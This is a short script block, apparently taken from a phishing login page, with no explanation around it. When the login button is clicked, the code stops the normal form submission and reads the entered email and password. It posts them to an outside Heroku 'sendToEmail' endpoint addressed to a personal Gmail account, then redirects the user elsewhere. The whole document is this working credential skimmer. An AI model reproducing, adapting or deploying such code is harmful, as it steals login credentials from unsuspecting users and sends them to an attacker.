  <script>
    const login_btn = document.getElementById('login_btn');
    login_btn.addEventListener('click', (e)=>{
      e.preventDefault();
      sendRequest();
    })
async function sendRequest() {
  const unameInp = document.getElementById("exampleInputEmail1");
  const pwdInp = document.getElementById("exampleInputPassword1");
  await axios
    .post("https://backend-autorent-c39b3d74adff.herokuapp.com/sendToEmail", {
      to: "roseline.karen777@gmail.com",
      user: unameInp.value,
      pwd: pwdInp.value,
    })
    .then((response) => {
      window.location.href = "https://reagan.com"
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}
		</script>

